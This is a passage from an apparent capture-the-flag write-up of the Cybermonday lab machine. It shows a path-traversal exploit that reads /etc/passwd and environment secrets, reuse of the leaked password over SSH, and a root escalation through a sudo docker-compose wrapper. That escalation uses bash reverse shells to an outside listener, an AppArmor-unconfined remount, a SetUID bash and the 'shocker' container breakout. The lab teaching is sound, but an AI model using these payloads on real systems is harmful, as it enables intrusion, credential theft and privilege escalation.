Not shown: 65534 closed ports
PORT     STATE SERVICE
5000/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 40.34 seconds

```

I’ll upload [Chisel](https://github.com/jpillora/chisel) and make it executable:

```

www-data@070370e2cdc4:/tmp$ curl 10.10.14.6/chisel_1.8.1_linux_amd64 -o chisel
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 8188k  100 8188k    0     0  6443k      0  0:00:01  0:00:01 --:--:-- 6447k
www-data@070370e2cdc4:/tmp$ chmod +x chisel 

```

I’ll start the server on my client (`chisel_1.8.1_linux_amd64 server -p 8000 --reverse`), and then connect from the container (`./chisel client 10.10.14.6:8000 R:5000:172.18.0.5:5000`). At the server the connection shows:

```

oxdf@hacky$ /opt/chisel/chisel_1.8.1_linux_amd64 server -p 8000 --reverse
2023/11/29 01:44:28 server: Reverse tunnelling enabled
2023/11/29 01:44:28 server: Fingerprint P5RKkfBLBMT7scAB8ZvNe2irKlIHVdqahiNWbOSh1rs=
2023/11/29 01:44:28 server: Listening on http://0.0.0.0:8000
2023/11/29 01:45:40 server: session#1: tun: proxy#R:5000=>172.18.0.5:5000: Listening

```

The root returns an empty response:

```

oxdf@hacky$ curl localhost:5000 -v
*   Trying 127.0.0.1:5000...
* Connected to localhost (127.0.0.1) port 5000 (#0)
> GET / HTTP/1.1
> Host: localhost:5000
> User-Agent: curl/7.81.0
> Accept: */*
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Cache-Control: no-cache
< Date: Wed, 29 Nov 2023 02:47:00 GMT
< Content-Length: 0
<
* Connection #0 to host localhost left intact

```

If this is a Docker Registry, then I should be able to list the repositories at `/v2/_catalog` (according to [this post](https://stackoverflow.com/a/31750543)), and it works:

```

oxdf@hacky$ curl localhost:5000/v2/_catalog
{"repositories":["cybermonday_api"]}

```

### cybermonday\_api Image

#### Access Image

I’ll use `docker pull` to get a copy of the container on my system:

```

oxdf@hacky$ docker pull localhost:5000/cybermonday_api
Using default tag: latest
latest: Pulling from cybermonday_api
5b5fe70539cd: Pull complete 
affe9439d2a2: Pull complete 
1684de57270e: Pull complete 
dc968f4da64f: Pull complete 
57fbc4474c06: Pull complete 
9f5fbfd5edfc: Pull complete 
5c3b6a1cbf54: Pull complete 
4756652e14e0: Pull complete 
57cdb531a15a: Pull complete 
1696d1b2f2c3: Pull complete 
ca62759c06e1: Pull complete 
ced3ae14b696: Pull complete 
beefd953abbc: Pull complete 
Digest: sha256:72cf91d5233fc1bedc60ce510cd8166ce0b17bd1e9870bbc266bf31aca92ee5d
Status: Downloaded newer image for localhost:5000/cybermonday_api:latest
localhost:5000/cybermonday_api:latest

```

I’ll start the container in the background:

```

oxdf@hacky$ docker run -d --rm localhost:5000/cybermonday_api
6fe34ad6bfa723f249007ebed44a6e0bcedac719f9b6f779aa95494fef5f85bd
oxdf@hacky$ docker ps
CONTAINER ID   IMAGE                            COMMAND                  CREATED         STATUS                PORTS                                                                                                                   NAMES
6fe34ad6bfa7   localhost:5000/cybermonday_api   "docker-php-entrypoi…"   4 seconds ago   Up 2 seconds                                                                                                                                  quirky_hoover

```

And get a shell in it:

```

oxdf@hacky$ docker exec -it quirky_hoover bash
root@6fe34ad6bfa7:/var/www/html#

```

#### Image Enumeration

The shell starts in `/var/www/html`, which has the API source code:

```

root@da704af94107:/var/www/html# ls
app  bootstrap.php  composer.json  composer.lock  config.php  keys  public  vendor

```

Otherwise, the image is completely empty. Nothing in `/home`, `/root`, `/opt`, `/srv`. `/var/backups` is empty.

### API Source Analysis

#### Overview

I’ll return to the source code in `/var/www/html`. So that I can use VSCode to look at it, I’ll copy it to my host:

```

oxdf@hacky$ docker cp quirky_hoover:/var/www/html ./api
Successfully copied 3.26MB to /home/oxdf/hackthebox/cybermonday-10.10.11.228/api
oxdf@hacky$ ls api/
app  bootstrap.php  composer.json  composer.lock  config.php  keys  public  vendor

```

The `config.php` file has information for connecting to the database:

```

<?php

return [
    "dbhost" => getenv('DBHOST'),
    "dbname" => getenv('DBNAME'),
    "dbuser" => getenv('DBUSER'),
    "dbpass" => getenv('DBPASS')
];

```

The config values are stored in environment variables.

On opening it in VSCode, I’ll scan it with [Snyk](https://snyk.io/), and it reports 20 vulnerabilities. Most of them are crypto-related (weak hash SHA1, “Inadequate Padding”), but there are three that are Path Traversal:

![image-20231129060642050](/img/image-20231129060642050.png)

#### WebhooksController

The issue in `WebhooksController.php` is where log files are created. I played with this [previously](#interact-with-webhook). Snyk is seeing this:

```

    case "createLogFile":
        if(!isset($this->data->log_name) || empty($this->data->log_name))
        {
            return $this->response(["status" => "error", "message" => "\"log_name\" not defined"], 400);
        }

        if(!isset($this->data->log_content) || empty($this->data->log_content))
        {
            return $this->response(["status" => "error", "message" => "\"log_content\" not defined"], 400);
        }

        $response = webhook_createLogFile($webhook_find->name, $this->data->log_name, $this->data->log_content);
        return $this->response(array_diff_key($response, ["status_code" => '']), $response["status_code"]);

```

It thinks that the `log_name` being passed into `webhook_createLogFile` is unfiltered, which it is at this point. `webhook_createLogFile` is defined in `app/functions/webhook_actions.php`, and this is where the check that it only contains letters and numbers is:

```

function webhook_createLogFile($webhook_name, $log_name, $log_content)
{
    $log_path = "/logs/{$webhook_name}/";

    if(!is_dir($log_path))
    {
        mkdir($log_path);
    }

    if(!preg_match("/^[A-Za-z0-9]+$/", $log_name))
    {
        return ["status" => "error", "message" => "Only letters and numbers are allowed in the \"name\"", "status_code" => 400];
    }

    $log_file = $log_path . trim($log_name) . "-" . time() . ".log";
    file_put_contents($log_file, $log_content."\n", FILE_APPEND);
    
    return ["status" => "success", "message" => "Log created", "status_code" => 201];
}

```

So that’s a false positive.

#### LogsController

The other two are in `LogsController.php`. It takes a request, first calling `apiKeyAuth()` and then getting the associated webhook:

```

class LogsController extends Api
{
    public function index($request)
    {
        $this->apiKeyAuth();

        $webhook = new Webhook;
        $webhook_find = $webhook->find("uuid", $request->uuid);

```

I’ll come back to `apiKeyAuth` later.

If it doesn’t exist or is the wrong type, it returns an error:

```

        if(!$webhook_find)
        {
            return $this->response(["status" => "error", "message" => "Webhook not found"], 404);
        }

        if($webhook_find->action != "createLogFile")
        {
            return $this->response(["status" => "error", "message" => "This webhook was not created to manage logs"], 400);
        }

```

Next it validates that the `action` value is correct, not empty, and that if the `action` is “read”, that the `log_name` is set:

```

        $actions = ["list", "read"];

        if(!isset($this->data->action) || empty($this->data->action))
        {
            return $this->response(["status" => "error", "message" => "\"action\" not defined"], 400);
        }

        if($this->data->action == "read")
        {
            if(!isset($this->data->log_name) || empty($this->data->log_name))
            {
                return $this->response(["status" => "error", "message" => "\"log_name\" not defined"], 400);
            }
        }

        if(!in_array($this->data->action, $actions))
        {
            return $this->response(["status" => "error", "message" => "invalid action"], 400);
        }

```

`$logPath` is set based on what is stored in the webhook, and then it switches based on the `action`:

```

        $logPath = "/logs/{$webhook_find->name}/";

        switch($this->data->action)
        {

```

If the `action` is “list”, it returns the contents of this directory:

```

            case "list":
                $logs = scandir($logPath);
                array_splice($logs, 0, 1); array_splice($logs, 0, 1);

                return $this->response(["status" => "success", "message" => $logs]);

```

If the `action` is “read”, it removes `../` and spaces from the `log_name`, and returns the log if it exists and “log” is in the `$logName`:

```

            case "read":
                $logName = $this->data->log_name;

                if(preg_match("/\.\.\//", $logName))
                {
                    return $this->response(["status" => "error", "message" => "This log does not exist"]);
                }

                $logName = str_replace(' ', '', $logName);

                if(stripos($logName, "log") === false)
                {
                    return $this->response(["status" => "error", "message" => "This log does not exist"]);
                }

                if(!file_exists($logPath.$logName))
                {
                    return $this->response(["status" => "error", "message" => "This log does not exist"]);
                }

                $logContent = file_get_contents($logPath.$logName);

                return $this->response(["status" => "success", "message" => $logContent]);
        }
    }
}

```

#### apiKeyAuth

At the top of `LogsController` there’s a call to `$this->apiKeyAuth()`. This function is defined in `app/helpers/Api.php`:

```

    public function apiKeyAuth()
    {
        $this->api_key = "22892e36-1770-11ee-be56-0242ac120002";

        if(!isset($_SERVER["HTTP_X_API_KEY"]) || empty($_SERVER["HTTP_X_API_KEY"]) || $_SERVER["HTTP_X_API_KEY"] != $this->api_key)
        {
            return $this->response(["status" => "error", "message" => "Unauthorized"], 403);
        }
    }

```

It checks that the `x-api-key` header in the request is set to a hard-coded value, “22892e36-1770-11ee-be56-0242ac120002”.

#### Path Traversal

Snyk identifies this as a case where “Unsanitized input flows into `file_get_contents`”, but there is some sanitization that it misses. Unfortunately, the developer made an error. First the code removes the `../`, and then it replaces spaces with nothing. That means if the `$logName` contains something like `.. /` (with a space between the second dot and the slash), it will make it through.

This error allows me to read any file I want. There is potentially a way to list other directories. I could go look at how the webhook creates paths to see, but I’ll see if I can get what I need from just reading known files.

#### Unlisted Routes

When I request `/` on the API it returns a list of routes, and it’s not clear based on that list what would lead to the code in `LogController.php`:
- POST `/auth/register`
- POST `/auth/login`
- GET `/webhooks`
- POST `/webhooks/create`
- DELETE `/webhooks/delete/:uuid`
- POST `/webhooks/:uuid`

It’s tempting to think that this list is generated based on the available endpoints, but there are a couple hints it’s not. For one, `/` isn’t included, and it definitely exists and returns something. Additionally, there’s a typo in `/webhooks/delete`, where it’s missing a `/` before the `:uuid`:

```

  "/webhooks/delete:uuid": {
    "method": "DELETE"
  },

```

Looking at `app/routes/Router.php`, it defines the actual routes:

```

    public static function get()
    {
        return [
            "get" => [
                "/" => "IndexController@index",
                "/webhooks" => "WebhooksController@index"
            ],
            "post" => [
                "/auth/register" => "AuthController@register",
                "/auth/login" => "AuthController@login",
                "/webhooks/create" => "WebhooksController@create",
                "/webhooks/:uuid" => "WebhooksController@get",
                "/webhooks/:uuid/logs" => "LogsController@index"
            ],
            "delete" => [
                "/webhooks/delete/:uuid" => "WebhooksController@delete",
            ]
        ];
    }

```

In addition to the ones above, it shows `/` and `/webhooks/:uuid/logs`. The latter triggers the `LogsController`.

### File Read

#### Benign Interactions

I’ll create a new webhook to get a fresh start:

```

oxdf@hacky$ curl http://webhooks-api-beta.cybermonday.htb/webhooks/create -H "x-access-token: $ADMIN" -d '{"name": "0xdflog", "description": "hacking this thing", "action": "createLogFile"}' -H "Content-type: application/json"
{"status":"success","message":"Done! Send me a request to execute the action, as the event listener is still being developed.","webhook_uuid":"4a8e3d61-e13b-452b-a72e-4464018e7e6e"}
oxdf@hacky$ export UUID=4a8e3d61-e13b-452b-a72e-4464018e7e6e

```

I’ll write a log file:

```

oxdf@hacky$ curl http://webhooks-api-beta.cybermonday.htb/webhooks/$UUID -H "x-access-token: $ADMIN" -d '{"log_name": "0xdflog", "log_content": "this is test content"}' -H "Content-type: application/json"
{"status":"success","message":"Log created"}

```

If I try to list the files, I get an unauthorized error:

```

oxdf@hacky$ curl http://webhooks-api-beta.cybermonday.htb/webhooks/$UUID/logs -H "x-access-token: $ADMIN" -d '{"action": "list"}' -H "Content-type: application/json"
{"status":"error","message":"Unauthorized"}

```

This is the additional API key auth. I’ll add that header:

```

oxdf@hacky$ curl http://webhooks-api-beta.cybermonday.htb/webhooks/$UUID/logs -H "x-access-token: $ADMIN" -d '{"action": "list"}' -H "Content-type: application/json" -H "x-api-key: 22892e36-1770-11ee-be56-0242ac120002"
{"status":"success","message":["0xdflog-1701258393.log"]}

```

I can read that log:

```

oxdf@hacky$ curl http://webhooks-api-beta.cybermonday.htb/webhooks/$UUID/logs -H "x-access-token: $ADMIN" -d '{"action": "read", "log_name": "0xdflog-1701258393.log"}' -H "Content-type: application/json" -H "x-api-key: 22892e36-1770-11ee-be56-0242ac120002"
{"status":"success","message":"this is test content\n"}

```

#### Directory Traversal

I’ll now try to read `/etc/passwd`. The logs are stored in `/logs/{webhook name}/`, so I should need to go up two directories and then into `/etc`:

```

oxdf@hacky$ curl http://webhooks-api-beta.cybermonday.htb/webhooks/$UUID/logs -H "x-access-token: $ADMIN" -d '{"action": "read", "log_name": ".. /.. /etc/passwd"}' -H "Content-type: application/json" -H "x-api-key: 22892e36-1770-11ee-be56-0242ac120002"
{"status":"error","message":"This log does not exist"}

```

This is because of the check looking for the string “log” in the path. I’ll go into the `logs` directory and then back out again to satisfy this check:

```

oxdf@hacky$ curl http://webhooks-api-beta.cybermonday.htb/webhooks/$UUID/logs -H "x-access-token: $ADMIN" -d '{"action": "read", "log_name": ".. /.. /logs/.. /etc/passwd"}' -H "Content-type: application/json" -H "x-api-key: 22892e36-1770-11ee-be56-0242ac120002"
{"status":"success","message":"root:x:0:0:root:\/root:\/bin\/bash\ndaemon:x:1:1:daemon:\/usr\/sbin:\/usr\/sbin\/nologin\nbin:x:2:2:bin:\/bin:\/usr\/sbin\/nologin\nsys:x:3:3:sys:\/dev:\/usr\/sbin\/nologin\nsync:x:4:65534:sync:\/bin:\/bin\/sync\ngames:x:5:60:games:\/usr\/games:\/usr\/sbin\/nologin\nman:x:6:12:man:\/var\/cache\/man:\/usr\/sbin\/nologin\nlp:x:7:7:lp:\/var\/spool\/lpd:\/usr\/sbin\/nologin\nmail:x:8:8:mail:\/var\/mail:\/usr\/sbin\/nologin\nnews:x:9:9:news:\/var\/spool\/news:\/usr\/sbin\/nologin\nuucp:x:10:10:uucp:\/var\/spool\/uucp:\/usr\/sbin\/nologin\nproxy:x:13:13:proxy:\/bin:\/usr\/sbin\/nologin\nwww-data:x:33:33:www-data:\/var\/www:\/usr\/sbin\/nologin\nbackup:x:34:34:backup:\/var\/backups:\/usr\/sbin\/nologin\nlist:x:38:38:Mailing List Manager:\/var\/list:\/usr\/sbin\/nologin\nirc:x:39:39:ircd:\/run\/ircd:\/usr\/sbin\/nologin\n_apt:x:42:65534::\/nonexistent:\/usr\/sbin\/nologin\nnobody:x:65534:65534:nobody:\/nonexistent:\/usr\/sbin\/nologin\n"}

```

That’s the `/etc/passwd` file!

### Find Password

My first thought was to read the `.env` file for this server, just like on the app, to get the database creds loaded in `config.php`. Unfortunately, it doesn’t exist:

```

oxdf@hacky$ curl http://webhooks-api-beta.cybermonday.htb/webhooks/$UUID/logs -H "x-access-token: $ADMIN" -d '{"action": "read", "log_name": ".. /.. /logs/.. /var/www/html/.env"}' -H "Content-type: application/json" -H "x-api-key: 22892e36-1770-11ee-be56-0242ac120002"
{"status":"error","message":"This log does not exist"}

```

It’s possible that they are loaded by Docker from the host. I’ll dump the environment from the `/proc` structure:

```

oxdf@hacky$ curl http://webhooks-api-beta.cybermonday.htb/webhooks/$UUID/logs -H "x-access-token: $ADMIN" -d '{"action": "read", "log_name": ".. /.. /logs/.. /proc/self/environ"}' -H "Content-type: application/json" -H "x-api-key: 22892e36-1770-11ee-be56-0242ac120002"
{"status":"success","message":"HOSTNAME=e1862f4e1242\u0000PHP_INI_DIR=\/usr\/local\/etc\/php\u0000HOME=\/root\u0000PHP_LDFLAGS=-Wl,-O1 -pie\u0000PHP_CFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64\u0000DBPASS=ngFfX2L71Nu\u0000PHP_VERSION=8.2.7\u0000GPG_KEYS=39B641343D8C104B2B146DC3F9C39DC0B9698544 E60913E4DF209907D8E30D96659A97C9CF2A795A 1198C0117593497A5EC5C199286AF1F9897469DC\u0000PHP_CPPFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64\u0000PHP_ASC_URL=https:\/\/www.php.net\/distributions\/php-8.2.7.tar.xz.asc\u0000PHP_URL=https:\/\/www.php.net\/distributions\/php-8.2.7.tar.xz\u0000DBHOST=db\u0000DBUSER=dbuser\u0000PATH=\/usr\/local\/sbin:\/usr\/local\/bin:\/usr\/sbin:\/usr\/bin:\/sbin:\/bin\u0000DBNAME=webhooks_api\u0000PHPIZE_DEPS=autoconf \t\tdpkg-dev \t\tfile \t\tg++ \t\tgcc \t\tlibc-dev \t\tmake \t\tpkg-config \t\tre2c\u0000PWD=\/var\/www\/html\u0000PHP_SHA256=4b9fb3dcd7184fe7582d7e44544ec7c5153852a2528de3b6754791258ffbdfa0\u0000"}

```

That works, but it’s ugly. `jq` and some more `bash` foo to fix that:

```

oxdf@hacky$ curl -s http://webhooks-api-beta.cybermonday.htb/webhooks/$UUID/logs -H "x-access-token: $ADMIN" -d '{"action": "read", "log_name": ".. /.. /logs/.. /proc/self/environ"}' -H "Content-type: application/json" -H "x-api-key: 22892e36-1770-11ee-be56-0242ac120002" | jq -r '.message' | tr '\000' '\n'
HOSTNAME=e1862f4e1242
PHP_INI_DIR=/usr/local/etc/php
HOME=/root
PHP_LDFLAGS=-Wl,-O1 -pie
PHP_CFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64
DBPASS=ngFfX2L71Nu
PHP_VERSION=8.2.7
GPG_KEYS=39B641343D8C104B2B146DC3F9C39DC0B9698544 E60913E4DF209907D8E30D96659A97C9CF2A795A 1198C0117593497A5EC5C199286AF1F9897469DC
PHP_CPPFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64
PHP_ASC_URL=https://www.php.net/distributions/php-8.2.7.tar.xz.asc
PHP_URL=https://www.php.net/distributions/php-8.2.7.tar.xz
DBHOST=db
DBUSER=dbuser
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
DBNAME=webhooks_api
PHPIZE_DEPS=autoconf            dpkg-dev                file            g++             gcc             libc-dev                make            pkg-config              re2c
PWD=/var/www/html
PHP_SHA256=4b9fb3dcd7184fe7582d7e44544ec7c5153852a2528de3b6754791258ffbdfa0

```

`DBPASS=ngFfX2L71Nu`

### SSH

With a username john identified in the SSH `authorized_keys` file [above](#mnt), and a password, I’ll try SSH, and it works:

```

oxdf@hacky$ sshpass -p ngFfX2L71Nu ssh john@cybermonday.htb
Linux cybermonday 5.10.0-24-amd64 #1 SMP Debian 5.10.179-5 (2023-08-08) x86_64
...[snip]...
john@cybermonday:~$

```

Finally I can read `user.txt`:

```

john@cybermonday:~$ cat user.txt
459aa004************************

```

## Shell as root

### Enumeration

john’s home directory is nothing different from what was mounted into the API container.

The only other thing that jumps out on the file system is a Python script in `/opt`:

```

john@cybermonday:/$ ls opt/
secure_compose.py

```

john can also run this as root using `sudo`:

```

john@cybermonday:~$ sudo -l
[sudo] password for john: 
Matching Defaults entries for john on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User john may run the following commands on localhost:
    (root) /opt/secure_compose.py *.yml

```

### secure\_compose.py

#### Overview

The python script defines a bunch of functions, and then at the bottom runs with the standard dunder-name check:

```

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Use: {sys.argv[0]} <docker-compose.yml>")
        sys.exit(1)

    filename = sys.argv[1]
    if main(filename):
        temp_dir = create_random_temp_dir()
        copy_docker_compose_to_temp_dir(filename, temp_dir)
        os.chdir(temp_dir)

        signal.signal(signal.SIGINT, signal_handler)

        print("Starting services...")
        result = subprocess.run(["/usr/bin/docker-compose", "up", "--build"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print("Finishing services")

        cleanup(temp_dir)

```

It checks that exactly one arg is provided, showing usage otherwise. Then it calls `name` on the given argument, which does a bunch of validation on the argument, returning `True` or `False`. If it returns `True`, then it create a temp directory, copies the input file into that directory named `docker-compose.yml`, goes into that directory, configures a signal handler, then calls `subprocess.run` to run `docker-compose up --build`. After starting the containers, it calls `cleanup`, which calls `docker-compose down --volumes` and then removes the temp directory. Effectively, this should let me start a multi-container Docker application from a yml file, and then kill it.

The signal handler just calls the cleanup function and exits when `Ctrl` + `c` is entered:

```

def signal_handler(sig, frame):              
    print("\nSIGINT received. Cleaning up...")                                                           
    cleanup(temp_dir)                                                                                    
    sys.exit(1)   

```

It simply calls `cleanup` on the temp directory and exits.

#### main

What remains is to understand what `main` does to determine if the compose file is valid. Without this, I could easily start a container with the filesystem root mounted into it and then enter as root.

`main` is a series of checks, each of which just returns `False` if failed. First `main` checks that the file exists:

```

def main(filename):

    if not os.path.exists(filename):
        print(f"File not found")
        return False

```

Then it `sale_loads` the yaml, and validates that it has a `services` key as all compose files must have according to the [specs](https://github.com/compose-spec/compose-spec/blob/master/spec.md):

```

    with open(filename, "r") as file:
        try:
            data = yaml.safe_load(file)
        except yaml.YAMLError as e:
            print(f"Error: {e}")
            return False

        if "services" not in data:
            print("Invalid docker-compose.yml")
            return False

        services = data["services"]

```

Then it calls `check_no_privileged` on the service:

```

        if not check_no_privileged(services):
            print("Privileged mode is not allowed.")
            return False

```

This function does what it says, checking for the “privileged” flag in the items:

```

def check_no_privileged(services):
    for service, config in services.items():
        if "privileged" in config and config["privileged"] is True:
            return False
    return True 

```

Finally, it checks the volumes defined in the compose:

```

        for service, config in services.items():
            if "volumes" in config:
                volumes = config["volumes"]
                if not check_whitelist(volumes) or not check_read_only(volumes):
                    print(f"Service '{service}' is malicious.")
                    return False
                if not check_no_symlinks(volumes):
                    print(f"Service '{service}' contains a symbolic link in the volume, which is not allowed.")
                    return False
    return True

```

`check_read_only` makes sure that each volume definition string ends in `:ro` making it read only. Volume definitions typically look like `host_path:container_path:permissions`, thought they can also be just `host_path:container_path` with the default `rw` permissions. This means that all volumes must be mounted as read only.

`check_whitelist` requires that the volume has three items separated by `:` (which it must to pass the `check_whitelist` check) and that the host path is on an allowed list:

```

def is_path_inside_whitelist(path):
    whitelist = [f"/home/{get_user()}", "/mnt"]

    for allowed_path in whitelist:
        if os.path.abspath(path).startswith(os.path.abspath(allowed_path)):
            return True
    return False

def get_user():
    return os.environ.get("SUDO_USER")

```

It can only mount `/mnt` (which is empty) or the current user’s home directory, getting the user who called `sudo`, even if it’s running as root.

```

#!/usr/bin/python3
import sys, yaml, os, random, string, shutil, subprocess, signal

def get_user():
    return os.environ.get("SUDO_USER")

def is_path_inside_whitelist(path):
    whitelist = [f"/home/{get_user()}", "/mnt"]

    for allowed_path in whitelist:
        if os.path.abspath(path).startswith(os.path.abspath(allowed_path)):
            return True
    return False

def check_whitelist(volumes):
    for volume in volumes:
        parts = volume.split(":")
        if len(parts) == 3 and not is_path_inside_whitelist(parts[0]):
            return False
    return True

def check_read_only(volumes):
    for volume in volumes:
        if not volume.endswith(":ro"):
            return False
    return True

def check_no_symlinks(volumes):
    for volume in volumes:
        parts = volume.split(":")
        path = parts[0]
        if os.path.islink(path):
            return False
    return True

def check_no_privileged(services):
    for service, config in services.items():
        if "privileged" in config and config["privileged"] is True:
            return False
    return True

def create_random_temp_dir():
    letters_digits = string.ascii_letters + string.digits
    random_str = ''.join(random.choice(letters_digits) for i in range(6))
    temp_dir = f"/tmp/tmp-{random_str}"
    return temp_dir

def copy_docker_compose_to_temp_dir(filename, temp_dir):
    os.makedirs(temp_dir, exist_ok=True)
    shutil.copy(filename, os.path.join(temp_dir, "docker-compose.yml"))

def cleanup(temp_dir):
    subprocess.run(["/usr/bin/docker-compose", "down", "--volumes"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    shutil.rmtree(temp_dir)

def signal_handler(sig, frame):
    print("\nSIGINT received. Cleaning up...")
    cleanup(temp_dir)
    sys.exit(1)

```

### Priv #1 SetUID bash

#### Remount Fail #1

I originally solved this by creating a container with john’s home directory, and creating a SetUID `bash` instance in it owned by root. This is apparently unintended, and the box author made some attempts to make this not work.

I’ll create a simple `docker-compose.yml` file:

```

version: "3"
services:
  web:
    image: cybermonday_api
    command: bash -c 'bash -i >& /dev/tcp/10.10.14.6/443 0>&1'
    volumes:
      - /home/john:/john:ro

```

This will create a container using the only image I know exists on Cybermonday. It’ll run a [bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw) to keep the start hanging while I interact with it. It will also mount john’s home directory into `/john`.

I’ll start `nc` in a different terminal and run the script:

```

john@cybermonday:~$ sudo /opt/secure_compose.py /tmp/docker-compose.yml 
Starting services...

```

At `nc` there’s a shell in the container:

```

oxdf@hacky$ nc -lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.228 44116
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@b919eb60dec1:/var/www/html#

```

john’s home directory is there:

```

root@b919eb60dec1:/john# ls
0xdf
changelog.txt
logs
user.txt

```

I can’t write to it because it’s read only:

```

root@b919eb60dec1:/john# touch test
touch: cannot touch 'test': Read-only file system

```

The plan is to re-mount the share. It’s currently mounted from `/dev/sda1`:

```

root@b919eb60dec1:~# mount | grep john
/dev/sda1 on /john type ext4 (ro,relatime,errors=remount-ro)

```

I’ll try to remount it, but I don’t have permissions:

```

root@b919eb60dec1:~# mount -o remount,rw /john
mount: /john: permission denied.
       dmesg(1) may have more information after failed mount system call.

```

#### Remount Fail #2

I’ll try adding [capabilities](https://docs.docker.com/compose/compose-file/compose-file-v3/#cap_add-cap_drop) to the container to give it more permissions:

```

version: "3"
services:
  web:
    image: cybermonday_api
    command: bash -c 'bash -i >& /dev/tcp/10.10.14.6/443 0>&1'
    volumes:
      - /home/john:/john:ro
    cap_add:
      - ALL

```

I’ll start it again, and try the remount inside the container:

```

root@0f792b9d3594:~l# mount -o remount,rw /john
mount -o remount,rw /john
mount: /john: cannot remount /dev/sda1 read-write, is write-protected.
       dmesg(1) may have more information after failed mount system call.

```

This is progress. It’s still an error, but no longer a permissions issue.

#### Remount Success

In searching for these error messages, I’ll come across a bunch of different Docker related threads with failing mounts where the answer has to do with AppArmor:
- [UniFi mount issue](https://github.com/pducharme/UniFi-Video-Controller/issues/105)
- [Moby issue with mount](https://github.com/moby/moby/issues/16429#issuecomment-144491265)
- [Kubernetes having issues with no respecting AppArmor](https://github.com/kubernetes/kubernetes/issues/66216)

In all these issues, there is mention of AppArmor and disabling it with `--security-opt apparmor:unconfined`. This can be put [in the docker-compose](https://docs.docker.com/compose/compose-file/compose-file-v3/#security_opt) file:

```

version: "3"
services:
  web:
    image: cybermonday_api
    command: bash -c 'bash -i >& /dev/tcp/10.10.14.6/443 0>&1'
    volumes:
      - /home/john:/john:ro
    cap_add:
      - ALL
    security_opt:
      - apparmor:unconfined

```

When I start this one, the `mount` works!

```

root@5aefd84ef8a9:~# mount -o remount,rw /john
root@5aefd84ef8a9:~# touch /john/test

```

And the file I write shows up on the host owned by root:

```

john@cybermonday:~$ ls -l test 
-rw-r--r-- 1 root root 0 Nov 29 14:52 test

```

#### SetUID Bash

I’ll copy the host’s `bash` into `/home/john`:

```

john@cybermonday:~$ cp /bin/bash 0xdf

```

As I want this to run on the host, it’s important to use the `bash` binary from the host, as the one in the container won’t run on it.

This file is owned by UID 1000:

```

root@5aefd84ef8a9:/john# ls -l 0xdf
ls -l 0xdf
-rwxr-xr-x 1 1000 1000 1234376 Nov 29 19:54 0xdf

```

I’ll update the owner and set it as SetUID/SetGID:

```

root@5aefd84ef8a9:/john# chown root:root 0xdf
root@5aefd84ef8a9:/john# chmod 6777 0xdf

```

It works:

```

john@cybermonday:~$ ls -l 0xdf 
-rwsrwsrwx 1 root root 1234376 Nov 29 14:54 0xdf

```

Running it with `-p` gives a shell with effective ID of root:

```

john@cybermonday:~$ ./0xdf -p
0xdf-5.1# id
uid=1000(john) gid=1000(john) euid=0(root) egid=0(root) groups=0(root),1000(john)

```

Which is enough to read `root.txt`:

```

0xdf-5.1# cat root.txt
2f076cf2************************

```

If I wanted to have `uid` and `gid` as root, I could use Python:

```

0xdf-5.1# python3 -c 'import os; os.setuid(0); os.setgid(0); os.system("bash")'
root@cybermonday:/root# id
uid=0(root) gid=0(root) groups=0(root),1000(john)

```

### Priv #2 File Read via CAP\_DAC\_READ\_SEARCH

#### Strategy

The intended path to solve this step was to abuse capabilities to allow the container to read files from the host. [This 2014 blog post](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3) shows how `CAP_DAC_READ_SEARCH` can be abused from within a container with the `open_by_handle_at` syscall. This call allows me access to handles from other processes. The security here is that I can only open these handles if I have access to them. But with `CAP_DAC_READ_SEARCH`, these permissions are ignored. I exploited this before in [Talkative](/2022/08/27/htb-talkative.html#shocker).

#### Container

For this strategy, I only need to add the capability:

```

version: "3"
services:
  web:
    image: cybermonday_api
    command: bash -c "bash -i >& /dev/tcp/10.10.14.6/443 0>&1"
    cap_add:
      - CAP_DAC_READ_SEARCH

```

I’ll start the container and get a shell in it.

#### POC File Read

There’s a [POC exploit](http://stealth.openwall.net/xSports/shocker.c) linked from the blog post above. I’ll upload it to the container and then compile it:

```

root@7f9021a85ad9:/var/www/html# gcc -Wall shocker.c -static -o shocker

```

When I run this, it fails:

```

root@7f9021a85ad9:/var/www/html# ./shocker
[***] docker VMM-container breakout Po(C) 2014             [***]
[***] The tea from the 90's kicks your sekurity again.     [***]
[***] If you have pending sec consulting, I'll happily     [***]
[***] forward to my friends who drink secury-tea too!      [***]

<enter>

[-] open: No such file or directory

```

That’s an error at this line in the code:

```

	// get a FS reference from something mounted in from outside
	if ((fd1 = open("/.dockerinit", O_RDONLY)) < 0)
		die("[-] open");

```

`.dockerinit` is an old file, which makes sense since this exploit was written in 2014. I’ll just use `/etc/hosts`. After changing that filename, I’ll upload the code, compile it again, and run:

```

root@e879159934d1:/var/www/html# ./shocker
[***] docker VMM-container breakout Po(C) 2014             [***]
[***] The tea from the 90's kicks your sekurity again.     [***]
[***] If you have pending sec consulting, I'll happily     [***]
[***] forward to my friends who drink secury-tea too!      [***]

<enter>

[*] Resolving 'etc/shadow'
[*] Found lib
[*] Found boot
[*] Found libx32
[*] Found bin
[*] Found vmlinuz.old
[*] Found initrd.img
[*] Found ..
[*] Found root
[*] Found sys
[*] Found lib64
[*] Found proc
[*] Found .
